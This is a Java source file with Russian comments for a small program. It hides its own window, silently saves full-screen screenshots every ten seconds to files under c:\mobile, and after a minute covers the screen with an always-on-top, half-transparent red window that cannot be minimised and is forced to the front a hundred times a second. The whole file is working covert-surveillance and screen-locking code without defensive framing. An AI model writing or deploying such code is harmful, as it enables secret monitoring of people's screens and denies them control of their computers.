import java.awt.*;
import java.io.*;
import java.awt.event.*;
import java.awt.image.*;
import javax.imageio.*;
import javax.swing.*;

public class prog {
	public static void main(String[] args) {
		// Создаем объект окна
		new myFrame(); 				
	}
}

class myFrame extends JFrame
{
	// переменная типа Robot
	private Robot rob;
	// переменная типа Таймер
	private Timer tm;
	// Счетчик скриншотов
	private int kol=0;
	// Окно для блокировки
	private Frame wnd;

	// Конструктор класса
	public myFrame()
	{
		try
		{
			// Создаем новый объект класса Robot
			rob = new Robot();
		}
		catch (Exception e) {}
				
	    // Создаем таймер с задержкой в 10 секунд
	    tm = new Timer(10000,new ActionListener() {
		 public void actionPerformed(ActionEvent e) {
		    // Снимаем скриншот экрана и записываем его в файл
		    saveScreen();
		}
	    });	
	    // Запускаем таймер
	    tm.start();
		
	  // НЕ завершать работу приложения при закрытии окна
        setDefaultCloseOperation(JFrame.HIDE_ON_CLOSE);
        // Выводим окно
	  setVisible(true);
	  // И сразу его прячем
	  setVisible(false);
	}
	
	// Метод снятия скриншота экрана и сохранения его в файл
	private void saveScreen()
	{
		// Считаем количество скриншотов
		kol++;
		
		// Определяем текущее разрешение экрана
		Dimension dm = Toolkit.getDefaultToolkit().getScreenSize();
		int w = dm.width;
		int h = dm.height;
		
		try
		{
	         // Снимает скриншот экрана с помощью класса Robot
		   BufferedImage img = 
                  rob.createScreenCapture(new Rectangle(0,0,w,h));
      // Сохраняем изображение в PNG файле 
	ImageIO.write(img, "PNG", new File("c:\\mobile\\img"+kol+".png"));
		}
		catch (Exception e) {}
		
		// Когда пройдёт одна минута
		if (kol==6)
		{
		    // Таймер останавливаем
		    tm.stop();
			
		    // Создаем окно
		    wnd = new Frame();
		    // Отключаем возможность изменения размеров окна
		    wnd.setResizable(false);
		    // Устанавливаем размеры в полный экран
		    wnd.setBounds(0, 0, w, h);
		    // Устанавливаем цвет фона красный
		    wnd.setBackground(Color.RED);
		    // Размещаем окно сверху других окон
		    wnd.setAlwaysOnTop(true);
		    // Убираем рамку окна
		    wnd.setUndecorated(true);
		    // Делаем прозрачность 50%
		    wnd.setOpacity(0.5f);
		    
		    // Подключаем обработчик события
		    wnd.addWindowListener(new WindowAdapter() {
		    	// При сворачивании окна
			public void windowIconified(WindowEvent arg0) {
			      // Открываем окно на полный экран 
				wnd.setExtendedState(Frame.MAXIMIZED_BOTH);
	            	}
	        });
		    		    
		    // Выводим окно
		    wnd.setVisible(true);
			
	// Создаем таймер с задержкой в 10 миллисекунд (100 раз в секунду)
		    tm = new Timer(10,new ActionListener() {
				public void actionPerformed(ActionEvent e) {
				    // Выводим окно на передний план
				    wnd.toFront();						
				}
			});	
		    // Запускаем таймер
		    tm.start();
		    
		}		
	}
}
